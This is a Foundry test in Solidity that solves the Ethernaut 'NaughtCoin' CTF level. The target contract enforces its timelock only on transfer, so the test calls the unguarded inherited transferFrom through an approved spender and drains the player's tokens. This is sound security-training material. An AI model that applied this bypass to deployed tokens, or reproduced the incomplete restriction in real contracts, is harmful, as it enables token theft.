// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {NaughtCoin} from "../src/levels/NaughtCoin.sol";

/// Ethernaut #15 "NaughtCoin" → SC02 logic (incomplete restriction). The 10-year timelock is enforced
/// only on `transfer` (overridden), but the inherited ERC20 `transferFrom` is left unguarded — so the
/// player approves a spender and moves the tokens out that way. Win: player balance == 0.
contract NaughtCoinTest is Test {
    address player = makeAddr("player");
    address sink = makeAddr("sink");

    function test_solve_naughtcoin() public {
        NaughtCoin coin = new NaughtCoin(player);
        uint256 bal = coin.balanceOf(player);
        assertGt(bal, 0, "player funded");

        vm.startPrank(player);
        coin.approve(address(this), type(uint256).max); // approve a spender (the test)
        vm.stopPrank();
        coin.transferFrom(player, sink, bal); // bypasses the transfer-only timelock

        assertEq(coin.balanceOf(player), 0, "player emptied via transferFrom");
    }
}
